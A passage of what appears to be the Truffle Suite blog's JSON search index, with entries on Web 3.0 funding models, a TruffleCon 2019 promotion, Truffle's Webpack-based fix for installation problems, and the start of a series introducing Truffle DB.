funds.","title":"ICO\u2019s"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#continuous-funding-models","text":"Continuous Funding Models are business models that sell ERC-20 tokens over time, rather than all at once.","title":"Continuous Funding Models"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#curved-bonding","text":"Curved Bonding is a method of continuous funding that incentivizes early investment. In contrast to conventional ERC-20 token sales and ICO's, which feature each token being sold for the same price (no matter the time of purchase), such models hardcode buy prices according to an algorithmic curve. By purchasing early, investors get more tokens for the same price than if they are buying later. Ultimately, using Curved Bonding incentivizes early adopters to invest in a token.","title":"Curved Bonding"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#continuous-organizations","text":"A continuous organization is one that sets up a Decentralized Autonomous Trust (DAT). This trust is an immutable smart-contract that implements curve bonding to automatically mint, burn, and distribute security tokens called FAIR securities. Organizations provide value to the trust by diverting part or all of their cash flow to it.","title":"Continuous Organizations"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#streaming-money","text":"","title":"Streaming Money"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#side-channels","text":"A sidechain is a separate blockchain that is attached to its parent blockchain using a two-way peg. Using this model, you can move assets to the sidechain and then back to the parent chain. However, sidechains also need their miners. These miners receive an incentive through 'merged mining,' whereby two separate cryptocurrencies, based on the same algorithm, are mined simultaneously.","title":"Side Channels"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#state-channels","text":"State channels are mostly two-way pathways open between two users that want to communicate with each other in the form of transactions. Here, only the outcome needs to be included in the form of a single transaction on the main chain. Other transactions occur on off-chain.","title":"State Channels"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#the-future-of-internet-infrastructure","text":"As the development of Web 3.0 technology persists, blockchain technology will remain a vital component of online infrastructure. Although the world continues to benefit from the transformative power of the web, user empowerment remains a priority among a growing segment of society. In a time when centralized institutions and governments exert control over personal data, many have begun to challenge the status quo. Those exploring this emerging subset of the web are well-positioned to benefit from growing momentum. By leveraging Web 3.0 technologies, companies also have the ability to enact new, potentially lucrative business models. Regardless of the industry, the new web presents an opportunity to pivot from traditional revenue streams in search of more optimal solutions. In the midst of ongoing innovation, it\u2019s important to note that all new technology requires refinement - and Web 3.0 is only just beginning.","title":"The Future of Internet Infrastructure"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html","text":"Last year Truffle Suite launched TruffleCon , an event designed for the Truffle community and those interested in building world-changing applications powered by decentralized technologies. The event was received with an overwhelmingly positive response. TruffleCon attracted 250 attendees, 53 speakers, and 2 locations. After such a successful inaugural event, the team immediately started planning an even bigger and better Trufflecon for 2019. Join us this year on August 2-4 at the Microsoft Campus in Redmond, WA for the second annual event for the Truffle community: those who actively build using Truffle\u2019s framework for development on Ethereum. Programming will include speakers from the blockchain ecosystem, along with hands-on workshops geared toward novice users and expert builders alike. There\u2019s truly something for developers of all experience levels! TruffleCon places focus on the developer by exploring the many ways in which the Truffle tools can enhance the development process by increasing efficiency and enabling high-quality dapp production. We know that attending a blockchain conference often comes down to ROI for your organization. With so many learning and growth opportunities, here are a few things to remind your boss about when asking to send you to the 2nd Annual TruffleCon . Truffle is widely considered the most popular tool for blockchain application development \u00b6 Truffle is widely considered the most popular tool for blockchain application development with over 1.5 million lifetime downloads. Truffle supports developers across the full lifecycle of their projects, whether they are looking to build on Ethereum, Hyperledger, Quorum, or one of an ever-growing list of other supported platforms. Paired with Ganache, a personal blockchain, and Drizzle, a front-end dapp development kit, the full Truffle suite of tools promises to be an end-to-end dapp development platform. Truffle is being used by the largest and most prominent firms \u00b6 If your company want to implement blockchain solutions, you\u2019ll need to learn how to interact with Truffle suite of products. Truffle is used by many fortune 500 firms and will be the first company to integrate with AxCore, a proprietary blockchain created by Goldman Sachs and JPMorgan-backed Axoni, which is scheduled to start processing $10 trillion worth of transactions annually for the DTCC\u2019s Trade Information Warehouse later this year. Here are some of the amazing companies using or integrating Truffle: * Microsoft, ConsenSys, Amazon, VMWare Airbus, General Dynamics, J.P. Morgan and more! * Soon to be your company too! Build dapps hands on and learn to deploy smart contracts \u00b6 TrufflCon will have something for everyone from the novice and crypto curious to the advanced blockchain developers and everyone in between. Truffle\u2019s world-class developers and trainers will be there to support you along your developer journey. You\u2019ll learn hands-on how to build dapps and deploy smart contracts during our workshops. Meet and learn from the creators of Truffle Suite: the ones closest to Truffle\u2019s development \u00b6 Tim Coulter \u00b6 Tim Coulter is the Founder and CEO of Truffle. Before blockchain, Tim built a career specializing in software testing and developer support, which became extremely valuable in the early days of blockchain development. He's now surrounded by an amazing team building the next generation of blockchain development tools, and can't wait to tell you about what's to come. Mike Seese \u00b6 Mike Seese is a Core Developer on the Enterprise Products team. In addition to integrating the Truffle Suite to other ledgers and frameworks, he strives to bring the modern development experience to the blockchain community. Josh Quintal \u00b6 Josh is passionate about where the user meets the tech; this led to the creation of two products, Truffle Boxes and Drizzle. He also created \"Pet Shop\", one of Ethereum's most used beginner tutorials. Besides his obvious technical prowess,Josh is also the most stylish member of the Truffle team. G. Nicholas D\u2019Andrea \u00b6 Ever since 2016, he has been obsessed with the decentralized future and working towards building core software components for the blockchain ecosystem. Besides his work on Truffle, he is a core contributor to the EthPM package management system and author of EIP-1123. Kevin Bluer \u00b6 He\u2019s building our world-class program at Truffle University from the ground up which trains existing software developers to become Truffle-certified blockchain engineers. Outside of his work with Truffle, he has trained and mentored developers in cities around the globe including New York, Austin, London, Hong Kong, Shenzhen, and Kuala Lumpur. TruffleCon is a place to meet our developers and work with them, ask questions, and get feedback on your work. TruffleCon is for developers by developers \u00b6 While there is no shortage of conferences in the blockchain space, TruffleCon is uniquely created for developers, by developers. Tim Coulter, Truffle\u2019s Founder & CEO, explained, \"Developers attach their identity to the tools they're using. People are congregating around Truffle and want to learn from and collaborate with the people who are using the tools. We aim to host a conference where people can engage with their peers and share insights on how best to use these tools. We hope attendees will leave inspired and that the knowledge shared will transform how people build.\" There will be lots of chocolate \u00b6 If your boss is still not convinced, most importantly, there will be A LOT of chocolate. Now, send this to your boss so they can send you to TruffleCon! Secure Your Spot for TruffleCon 2019 in Redmond, WA August 2-4, 2019. More 2019 announcements are on the way\u200a\u2014 Subscribe to the Truffle newsletter and join the conversation on Telegram in the TruffleCon Channel .","title":"How to get your boss to send you to TruffleCon"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#truffle-is-widely-considered-the-most-popular-tool-for-blockchain-application-development","text":"Truffle is widely considered the most popular tool for blockchain application development with over 1.5 million lifetime downloads. Truffle supports developers across the full lifecycle of their projects, whether they are looking to build on Ethereum, Hyperledger, Quorum, or one of an ever-growing list of other supported platforms. Paired with Ganache, a personal blockchain, and Drizzle, a front-end dapp development kit, the full Truffle suite of tools promises to be an end-to-end dapp development platform.","title":"Truffle is widely considered the most popular tool for blockchain application development"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#truffle-is-being-used-by-the-largest-and-most-prominent-firms","text":"If your company want to implement blockchain solutions, you\u2019ll need to learn how to interact with Truffle suite of products. Truffle is used by many fortune 500 firms and will be the first company to integrate with AxCore, a proprietary blockchain created by Goldman Sachs and JPMorgan-backed Axoni, which is scheduled to start processing $10 trillion worth of transactions annually for the DTCC\u2019s Trade Information Warehouse later this year. Here are some of the amazing companies using or integrating Truffle: * Microsoft, ConsenSys, Amazon, VMWare Airbus, General Dynamics, J.P. Morgan and more! * Soon to be your company too!","title":"Truffle is being used by the largest and most prominent firms"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#build-dapps-hands-on-and-learn-to-deploy-smart-contracts","text":"TrufflCon will have something for everyone from the novice and crypto curious to the advanced blockchain developers and everyone in between. Truffle\u2019s world-class developers and trainers will be there to support you along your developer journey. You\u2019ll learn hands-on how to build dapps and deploy smart contracts during our workshops.","title":"Build dapps hands on and learn to deploy smart contracts"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#meet-and-learn-from-the-creators-of-truffle-suite-the-ones-closest-to-truffles-development","text":"","title":"Meet and learn from the creators of Truffle Suite: the ones closest to Truffle\u2019s development"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#tim-coulter","text":"Tim Coulter is the Founder and CEO of Truffle. Before blockchain, Tim built a career specializing in software testing and developer support, which became extremely valuable in the early days of blockchain development. He's now surrounded by an amazing team building the next generation of blockchain development tools, and can't wait to tell you about what's to come.","title":"Tim Coulter"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#mike-seese","text":"Mike Seese is a Core Developer on the Enterprise Products team. In addition to integrating the Truffle Suite to other ledgers and frameworks, he strives to bring the modern development experience to the blockchain community.","title":"Mike Seese"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#josh-quintal","text":"Josh is passionate about where the user meets the tech; this led to the creation of two products, Truffle Boxes and Drizzle. He also created \"Pet Shop\", one of Ethereum's most used beginner tutorials. Besides his obvious technical prowess,Josh is also the most stylish member of the Truffle team.","title":"Josh Quintal"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#g-nicholas-dandrea","text":"Ever since 2016, he has been obsessed with the decentralized future and working towards building core software components for the blockchain ecosystem. Besides his work on Truffle, he is a core contributor to the EthPM package management system and author of EIP-1123.","title":"G. Nicholas D\u2019Andrea"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#kevin-bluer","text":"He\u2019s building our world-class program at Truffle University from the ground up which trains existing software developers to become Truffle-certified blockchain engineers. Outside of his work with Truffle, he has trained and mentored developers in cities around the globe including New York, Austin, London, Hong Kong, Shenzhen, and Kuala Lumpur. TruffleCon is a place to meet our developers and work with them, ask questions, and get feedback on your work.","title":"Kevin Bluer"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#trufflecon-is-for-developers-by-developers","text":"While there is no shortage of conferences in the blockchain space, TruffleCon is uniquely created for developers, by developers. Tim Coulter, Truffle\u2019s Founder & CEO, explained, \"Developers attach their identity to the tools they're using. People are congregating around Truffle and want to learn from and collaborate with the people who are using the tools. We aim to host a conference where people can engage with their peers and share insights on how best to use these tools. We hope attendees will leave inspired and that the knowledge shared will transform how people build.\"","title":"TruffleCon is for developers by developers"},{"location":"blog/how-to-get-your-boss-to-send-you-to-trufflecon/index.html#there-will-be-lots-of-chocolate","text":"If your boss is still not convinced, most importantly, there will be A LOT of chocolate. Now, send this to your boss so they can send you to TruffleCon! Secure Your Spot for TruffleCon 2019 in Redmond, WA August 2-4, 2019. More 2019 announcements are on the way\u200a\u2014 Subscribe to the Truffle newsletter and join the conversation on Telegram in the TruffleCon Channel .","title":"There will be lots of chocolate"},{"location":"blog/how-were-making-installation-issues-a-thing-of-the-past/index.html","text":"**Update**: Since this blog post was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this post unaltered, but we highly recommend checking out our [Working with Ganache](/docs/ganache/using) page. It doesn't matter what operating system you're on -- if you've used Truffle in any capacity, you've likely run into an install issue in some form or another. This is especially true for Windows, as Windows doesn't generally ship with the necessary tools to install all of Truffle's important dependencies. And for most users, this sucks: getting hung up on installation is incredibly frustrating when you're usually just one error message or two away from creating your first Ethereum-enabled application. Well, I've got good news. As of the latest Truffle beta release, I'm happy to tell you that this is an issue no longer. That's right: No matter what platform you're on, your install issues should be over. This is big. In order to completely sidestep most if not all of the most common installation issues, we had to overcome some technical difficulties as well as rethink how we ship our code. In this post, I'm going to tell you about what we did and how that made installation incredibly simpler, on every platform, for everyone. So what was the problem? \u00b6 Since Truffle is a Javascript-based application, we (naturally) ship our code using the Node Package Manager (NPM for short). NPM hosts thousands if not millions of code packages, and it's the service that makes modern Javascript programming possible. Without NPM, not only would programming Truffle be nearly impossible, but programming anything complex in Javascript would be impossible: NPM lets developers separate and bundle code into its own individual chunks, called \"packages\", that any of those other chunks (packages) can then rely on. Because of NPM, Truffle is standing on the shoulders of giants. Truffle relies on the code of so many other people that if you looked at the full list you'd be hard pressed to give us credit for the codebase. And that's the beauty of it: packages like hashing functions and cryptographic libraries -- hard libraries to write (and get right!) -- we don't have to write ourselves. Though using dependencies on NPM has significant upsides, it also comes with significant drawbacks. Those same hashing functions -- functions used throughout Ethereum -- are written to be extremely performant, and so are written in C. In order to install those packages, NPM has to be able to compile them on the fly during installation, which means every Truffle user needs to have a C compiler installed. Additionally, NPM (for some reason) uses Python during the compilation process, which means Truffle users also need to have Python installed. Bottom line: In order to install a Javascript project, Truffle users need both C and Python. This is madness. So what can we do? \u00b6 Most of the issues people were seeing stem from the compilation process mentioned: Either they didn't have the right compilers/interpreters installed for C and Python, or C and Python itself required some dependency that wasn't properly installed. We've had a tutorial written for awhile that shows Windows users how to correctly set up their environment and get everything installed, but this required considerable effort from novice users and didn't take into account the many landmines hiding around every corner, waiting to explode at any moment. So we can't \"instruct\" our way around this problem. The only way to fix it, then, is to sidestep it completely. Sidestepping the compilation process means completely excising any compilation out of the installation process. The way we chose to tackle this is two ways: Remove any unnecessary dependencies that rely on compilation. Replace dependencies that need compilation with versions 100% written in Javascript. In theory this sounds easy: i.e., \"just use the Javascript versions or don't use the C versions as all\". In practice, this is much harder. Often, we don't directly control the dependencies our application relies on, because dependencies of dependencies (of dependencies of dependencies) might rely on a package that requires compilation. Since the bad apples are the packages that power the code we rely on (i.e., they're \"indirect dependencies\"), we have to surgically remove them and replace them with versions that install and function more easily. This is no small matter. Thankfully, a tool exists that makes this surgical replacement possible. It's called Webpack . Webpack bills itself as a Javascript bundler, aiming to mash together all your project's dependencies into a single blob of code, i.e., a \"bundle\". Webpack finds most of its uses in browser applications, as browsers need to download all code first before a website can be displayed, and it's more performant for the browser to download that code in a single request. However, for console applications like Truffle, Webpack can still be immensely valuable. By creating a bundle with Webpack, we can control exactly which dependencies get included in it. Take js-scrypt for instance. This library provides hashing functions required by Ethereum, is 100% written in Javascript, and is API-compatible with the C-compiled node-scrypt library. With Webpack, we can simply remove scrypt and replace it with js-scrypt like nothing happened. How about another example: Let's do IPFS. Truffle relies on the ethpm-js package to provide EthPM support, which itself relies on the ipfs package to communicate with IPFS servers. Somewhere deep down in ipfs 's dependency tree, some code needs the execSync package, a package that causes installation issues for some users. Using Webpack, when creating our bundle, we can just not include it . Since that code only matters for parts of IPFS that Truffle doesn't use, that code doesn't need to be in our bundle. Ex-nay, gone-yay . Zip, zilch, completely gone. Creating a bundle for our releases instead of letting NPM manage dependencies has other benefits as well. To keep code modular and maintainable, Truffle relies on almost 2000 packages! (This includes the dependencies of dependencies we mentioned before). Bundling ahead of time creates a single file users have to download during installation instead of requiring NPM to make requests for all 2000 dependencies. So not only do we get to sidestep all of the installation issues, but we make installation nearly instant as well. Yep. Feel free to party. We did. \ud83c\udf89 So how can you get it? \u00b6 Bundling Truffle's dependencies means releasing a version of the code where certain dependencies have been either replaced or removed. This not only means releasing structurally new code, but it means releasing code that has differing testability characteristics which change our ability to ensure its of the quality you've come to expect. We need to build infrastructure to help us do that, so in the meantime we've released the new version of the code in beta. To get the beta version of Truffle, first uninstall the version you currently have (they'll conflict): $ npm uninstall -g truffle And now install the beta version: $ npm install -g truffle@beta You'll notice that the beta version installs almost instantly, and no compilation is required. Hot-dog. So what's next? \u00b6 As we gain responses from the community about this new version we'll likely make changes to ensure we've sidestepped all the installation issues that have plagued users in the past. Once that's finished we'll make an official release. As well, we'll be performing this same work for the TestRPC in the coming weeks to ensure the TestRPC has the same hassle-free, instant installation that you'll soon come to expect from Truffle. If you run into issues with the beta version, don't hesitate to write up an issue in our issue tracker or reach out on the community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your questions. Cheers, and we appreciate your ongoing support and feedback. -- Tim & the Truffle Team","title":"How we're making installation issues a thing of the past"},{"location":"blog/how-were-making-installation-issues-a-thing-of-the-past/index.html#so-what-was-the-problem","text":"Since Truffle is a Javascript-based application, we (naturally) ship our code using the Node Package Manager (NPM for short). NPM hosts thousands if not millions of code packages, and it's the service that makes modern Javascript programming possible. Without NPM, not only would programming Truffle be nearly impossible, but programming anything complex in Javascript would be impossible: NPM lets developers separate and bundle code into its own individual chunks, called \"packages\", that any of those other chunks (packages) can then rely on. Because of NPM, Truffle is standing on the shoulders of giants. Truffle relies on the code of so many other people that if you looked at the full list you'd be hard pressed to give us credit for the codebase. And that's the beauty of it: packages like hashing functions and cryptographic libraries -- hard libraries to write (and get right!) -- we don't have to write ourselves. Though using dependencies on NPM has significant upsides, it also comes with significant drawbacks. Those same hashing functions -- functions used throughout Ethereum -- are written to be extremely performant, and so are written in C. In order to install those packages, NPM has to be able to compile them on the fly during installation, which means every Truffle user needs to have a C compiler installed. Additionally, NPM (for some reason) uses Python during the compilation process, which means Truffle users also need to have Python installed. Bottom line: In order to install a Javascript project, Truffle users need both C and Python. This is madness.","title":"So what was the problem?"},{"location":"blog/how-were-making-installation-issues-a-thing-of-the-past/index.html#so-what-can-we-do","text":"Most of the issues people were seeing stem from the compilation process mentioned: Either they didn't have the right compilers/interpreters installed for C and Python, or C and Python itself required some dependency that wasn't properly installed. We've had a tutorial written for awhile that shows Windows users how to correctly set up their environment and get everything installed, but this required considerable effort from novice users and didn't take into account the many landmines hiding around every corner, waiting to explode at any moment. So we can't \"instruct\" our way around this problem. The only way to fix it, then, is to sidestep it completely. Sidestepping the compilation process means completely excising any compilation out of the installation process. The way we chose to tackle this is two ways: Remove any unnecessary dependencies that rely on compilation. Replace dependencies that need compilation with versions 100% written in Javascript. In theory this sounds easy: i.e., \"just use the Javascript versions or don't use the C versions as all\". In practice, this is much harder. Often, we don't directly control the dependencies our application relies on, because dependencies of dependencies (of dependencies of dependencies) might rely on a package that requires compilation. Since the bad apples are the packages that power the code we rely on (i.e., they're \"indirect dependencies\"), we have to surgically remove them and replace them with versions that install and function more easily. This is no small matter. Thankfully, a tool exists that makes this surgical replacement possible. It's called Webpack . Webpack bills itself as a Javascript bundler, aiming to mash together all your project's dependencies into a single blob of code, i.e., a \"bundle\". Webpack finds most of its uses in browser applications, as browsers need to download all code first before a website can be displayed, and it's more performant for the browser to download that code in a single request. However, for console applications like Truffle, Webpack can still be immensely valuable. By creating a bundle with Webpack, we can control exactly which dependencies get included in it. Take js-scrypt for instance. This library provides hashing functions required by Ethereum, is 100% written in Javascript, and is API-compatible with the C-compiled node-scrypt library. With Webpack, we can simply remove scrypt and replace it with js-scrypt like nothing happened. How about another example: Let's do IPFS. Truffle relies on the ethpm-js package to provide EthPM support, which itself relies on the ipfs package to communicate with IPFS servers. Somewhere deep down in ipfs 's dependency tree, some code needs the execSync package, a package that causes installation issues for some users. Using Webpack, when creating our bundle, we can just not include it . Since that code only matters for parts of IPFS that Truffle doesn't use, that code doesn't need to be in our bundle. Ex-nay, gone-yay . Zip, zilch, completely gone. Creating a bundle for our releases instead of letting NPM manage dependencies has other benefits as well. To keep code modular and maintainable, Truffle relies on almost 2000 packages! (This includes the dependencies of dependencies we mentioned before). Bundling ahead of time creates a single file users have to download during installation instead of requiring NPM to make requests for all 2000 dependencies. So not only do we get to sidestep all of the installation issues, but we make installation nearly instant as well. Yep. Feel free to party. We did. \ud83c\udf89","title":"So what can we do?"},{"location":"blog/how-were-making-installation-issues-a-thing-of-the-past/index.html#so-how-can-you-get-it","text":"Bundling Truffle's dependencies means releasing a version of the code where certain dependencies have been either replaced or removed. This not only means releasing structurally new code, but it means releasing code that has differing testability characteristics which change our ability to ensure its of the quality you've come to expect. We need to build infrastructure to help us do that, so in the meantime we've released the new version of the code in beta. To get the beta version of Truffle, first uninstall the version you currently have (they'll conflict): $ npm uninstall -g truffle And now install the beta version: $ npm install -g truffle@beta You'll notice that the beta version installs almost instantly, and no compilation is required. Hot-dog.","title":"So how can you get it?"},{"location":"blog/how-were-making-installation-issues-a-thing-of-the-past/index.html#so-whats-next","text":"As we gain responses from the community about this new version we'll likely make changes to ensure we've sidestepped all the installation issues that have plagued users in the past. Once that's finished we'll make an official release. As well, we'll be performing this same work for the TestRPC in the coming weeks to ensure the TestRPC has the same hassle-free, instant installation that you'll soon come to expect from Truffle. If you run into issues with the beta version, don't hesitate to write up an issue in our issue tracker or reach out on the community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your questions. Cheers, and we appreciate your ongoing support and feedback. -- Tim & the Truffle Team","title":"So what's next?"},{"location":"blog/introducing-truffle-db-part-1/index.html","text":"Introducing Truffle DB, part 1: Artifact archeology \u00b6 Truffle is not a small utility: it compiles your contracts, deploys them to multiple networks, runs your automated tests, provides an interactive debugger for when things go wrong, offers a library for interacting with your contracts on the frontend, \u2026 ( the list goes on. ) With just over 20,000 lines of code and close to thirty discrete software packages, Truffle has a lot going on. Truffle is \u201cnot small\u201d on purpose. The tool oversees the development lifecycle in human developer terms. It keeps track of familiar concepts and hides unnecessary, low-level specifics. That\u2019s a big goal. So how does this work? Well, Truffle tries to be smart about it. It stores information about your contracts so that it can refer to it later. It tracks compilation results alongside the source code you wrote, maintaining a steady mapping between data for the blockchain and data for developers\u2019 brains . Right now, this system of record-keeping is served through Truffle\u2019s contract artifacts : the large JSON files that get saved in your build/contracts/ directory. Truffle saves your artifacts when you compile and updates your artifacts with address information when you migrate. Pretty much whenever you use any part of Truffle, these artifacts are read from disk and processed, enabling Truffle to paint itself (and you) a picture of what\u2019s happening in human terms. Truffle\u2019s artifacts have been enormously useful: the tool simply couldn\u2019t exist without this kind of first-class data capturing. Beyond that, though, being able to count on this data has enabled an ecosystem of other tools and utilities that build on top of Truffle\u2019s functionality using Truffle\u2019s artifacts format. Truffle\u2019s artifacts have served as a common language for representing smart contract development concepts. Unfortunately, Truffle\u2019s artifacts format has a number of core limitations that prevent Truffle from offering ideal behavior in several key situations. This post describes a few of these limitations. In this post\u2019s follow-up, we\u2019ll share information about a new system to manage this record-keeping, which we\u2019re calling Truffle DB . So what\u2019s the problem now? \u00b6 For starters: artifact files are huge! Too huge! In addition to Truffle reading your contract artifacts, your dapp\u2019s frontend code may read and use your artifacts to let users connect to any deployed network, etc. Problem is\u2014there\u2019s a ton of JSON. It\u2019s a mess, and it\u2019s in your face too much. **For example:** Truffle stores the same abstract syntax tree* (AST) in two different formats, in every single artifact! Most applications do not need this. *for the curious: the AST is the reason your code works whether you wrote it all on a single line or not. Source gets parsed, and the AST is the result. Truffle and other tools rely on the AST for things like debugging, code coverage, and linting. By the byte, almost all of the information in each contract artifact is for internal use or for some specific purpose. Only a small subset of the data in each artifact is necessary for your frontend or for you to think about directly. Thus far, users who have struggled with these large files needed to use a tool like jq or write a custom solution. In addition to these files being too large, the information is grouped purely by the idea of \u201ccontract name\u201d. What if you want to have two contracts with the same name? You can\u2019t. What if you want to debug an old version of your contract, deployed to a testnet? I hope you backed up your old artifacts directory somehow. Although we\u2019ve implemented plenty of workarounds to deal with these limitations, the problems do not go unnoticed. See some long-outstanding open GitHub issues, for example: * Truffle contract artifacts are too big and contain too much sensitive detail to actually deploy on the web (#1269) * Artifact is overwritten if there are two contracts with the same name (#1087) * Source map indexes are missing in artifacts (#1236) * Allow persistency of artifacts remotely (#1790) Unfortunately, these issues are blocked by the fundamental design of the contract artifacts. The root of the problem is that Truffle\u2019s artifacts try to serve two conflicting purposes: they try to serve the developer, but they also try to serve the tool itself. \u201cStop talking about data formats\u201d, you say. \u00b6 Right? Ideally, Truffle should silently keep complete records of everything you will ever need, and nothing more. And you, the developer, should only ever come face-to-face with the information you need at any given moment. So, for some time, we have been working on a plan to improve the state of affairs of Truffle\u2019s record-keeping. We\u2019ll get into it more in the next post, but Truffle DB aims to provide two things: * a data model: a set of terms that collectively represent various, high-level concepts associated with smart contract development * a flexible interface: a way to query and update your Truffle project\u2019s records In doing this, we\u2019re taking a data-first approach, organizing your project\u2019s information through immutable records and a clean separation of concerns. Stay tuned for the next post, where we\u2019ll talk about this more and outline our release plan for Truffle DB: what we\u2019ll be releasing first, what work still needs to be done, and how we plan to handle backwards compatibility over time.","title":"Introducing Truffle DB, Part 1 - Artifact archeology"},{"location":"blog/introducing-truffle-db-part-1/index.html#introducing-truffle-db-part-1-artifact-archeology","text":"Truffle is not a small utility: it compiles your contracts, deploys them to multiple networks, runs your automated tests, provides an interactive debugger for when things go wrong, offers a library for interacting with your contracts on the frontend, \u2026 ( the list goes on. ) With just over 20,000 lines of code and close to thirty discrete software packages, Truffle has a lot going on. Truffle is \u201cnot small\u201d on purpose. The tool oversees the development lifecycle in human developer terms. It keeps track of familiar concepts and hides unnecessary, low-level specifics. That\u2019s a big goal. So how does this work? Well, Truffle tries to be smart about it. It stores information about your contracts so that it can refer to it later. It tracks compilation results alongside the source code you wrote, maintaining a steady mapping between data for the blockchain and data for developers\u2019 brains . Right now, this system of record-keeping is served through Truffle\u2019s contract artifacts : the large JSON files that get saved in your build/contracts/ directory. Truffle saves your artifacts when you compile and updates your artifacts with address information when you migrate. Pretty much whenever you use any part of Truffle, these artifacts are read from disk and processed, enabling Truffle to paint itself (and you) a picture of what\u2019s happening in human terms. Truffle\u2019s artifacts have been enormously useful: the tool simply couldn\u2019t exist without this kind of first-class data capturing. Beyond that, though, being able to count on this data has enabled an ecosystem of other tools and utilities that build on top of Truffle\u2019s functionality using Truffle\u2019s artifacts format. Truffle\u2019s artifacts have served as a common language for representing smart contract development concepts. Unfortunately, Truffle\u2019s artifacts format has a number of core limitations that prevent Truffle from offering ideal behavior in several key situations. This post describes a few of these limitations. In this post\u2019s follow-up, we\u2019ll share information about a new system to manage this record-keeping, which we\u2019re calling Truffle DB .","title":"Introducing Truffle DB, part 1: Artifact archeology"},{"location":"blog/introducing-truffle-db-part-1/index.html#so-whats-the-problem-now","text":"For starters: artifact files are huge! Too huge! In addition to Truffle reading your contract artifacts, your dapp\u2019s frontend code may read and use your artifacts to let users connect to any deployed network, etc. Problem is\u2014there\u2019s a ton of JSON. It\u2019s a mess, and it\u2019s in your face too much. **For example:** Truffle stores the same abstract syntax tree* (AST) in two different formats, in every single artifact! Most applications do not need this. *for the curious: the AST is the reason your code works whether you wrote it all on a single line or not. Source gets parsed, and the AST is the result. Truffle and other tools rely on the AST for things like debugging, code coverage, and linting. By the byte, almost all of the information in each contract artifact is for internal use or for some specific purpose. Only a small subset of the data in each artifact is necessary for your frontend or for you to think about directly. Thus far, users who have struggled with these large files needed to use a tool like jq or write a custom solution. In addition to these files being too large, the information is grouped purely by the idea of \u201ccontract name\u201d. What if you want to have two contracts with the same name? You can\u2019t. What if you want to debug an old version of your contract, deployed to a testnet? I hope you backed up your old artifacts directory somehow. Although we\u2019ve implemented plenty of workarounds to deal with these limitations, the problems do not go unnoticed. See some long-outstanding open GitHub issues, for example: * Truffle contract artifacts are too big and contain too much sensitive detail to actually deploy on the web (#1269) * Artifact is overwritten if there are two contracts with the same name (#1087) * Source map indexes are missing in artifacts (#1236) * Allow persistency of artifacts remotely (#1790) Unfortunately, these issues are blocked by the fundamental design of the contract artifacts. The root of the problem is that Truffle\u2019s artifacts try to serve two conflicting purposes: they try to serve the developer, but they also try to serve the tool itself.","title":"So what\u2019s the problem now?"},{"location":"blog/introducing-truffle-db-part-1/index.html#stop-talking-about-data-formats-you-say","text":"Right? Ideally, Truffle should silently keep complete records of everything you will ever need, and nothing more. And you, the developer, should only ever come face-to-face with the information you need at any given moment. So, for some time, we have been working on a plan to improve the state of affairs of Truffle\u2019s record-keeping. We\u2019ll get into it more in the next post, but Truffle DB aims to provide two things: * a data model: a set of terms that collectively represent various, high-level concepts associated with smart contract development * a flexible interface: a way to query and update your Truffle project\u2019s records In doing this, we\u2019re taking a data-first approach, organizing your project\u2019s information through immutable records and a clean separation of concerns. Stay tuned for the next post, where we\u2019ll talk about this more and outline our release plan for Truffle DB: what we\u2019ll be releasing first, what work still needs to be done, and how we plan to handle backwards compatibility over time.","title":"\u201cStop talking about data formats\u201d, you say."},{"location":"blog/introducing-truffle-db-part-2/index.html","text":"Welcome back! If you missed the first part of this post, you may want to read it to learn more about Truffle\u2019s contract artifacts, their current limitations, and why we seek to build a better solution. Or, just to catch up: * Truffle currently stores information about your smart contracts in files that we call \u201ccontract artifacts\u201d (or just \u201cartifacts\u201d for short.) * Truffle uses these artifacts for pretty much everything. * Plenty of other tools use artifacts too, and rely on their behavior. * Unfortunately, the artifacts file format has several design flaws, forcing dozens of workarounds and even preventing certain use cases entirely. * Addressing these flaws head-on risks severe negative impact on other projects. * We\u2019re excited to share a project we\u2019ve been working on, to offer a deprecation plan and to encourage community involvement. So why should you care? * If you are a tools developer, or rely on Truffle artifacts directly in any way: there will be breaking changes! * If you use Truffle for smart contract development: the developer experience using Truffle will have fewer roadblocks (\u201c software warts \u201d). This will not break existing Truffle projects. * No matter who you are: better data means better tools. Great! I\u2019m convinced. \ud83d\ude01 Now, where were we? What is Truffle DB? \u00b6 Truffle DB comprises two key ideas, currently at different stages of development. These are: A data model for organizing your project\u2019s smart contracts: how to keep track of all the different pieces of information, from your contract source files to where they are deployed. A flexible JSON data access interface: how to read exactly the data you need and how to update the DB with the data you have. Data model \u00b6 **Data model excerpt**: how contracts, sources, compilers, and compilations all relate. ([Text-accessible version](https://github.com/trufflesuite/artifact-updates/blob/master/docs/uml/macros.iuml) available via diagram source) What is a smart contract? What is your contract\u2019s bytecode, what is its source code, and how do they relate? By looking at how Truffle expects these relationships in practice, and considering how these concepts are commonly understood, we hope to make life easy by creating a shared vocabulary for interacting with the smart contract domain. Diagrams are worth more than words here, so please check out our data model docs to get a broader sense for what this represents. Current status : Implemented as minimally viable, designed to be extended. Flexible interface \u00b6 **Concept image**: Example query to fetch specific project contract info. ([See gist for image 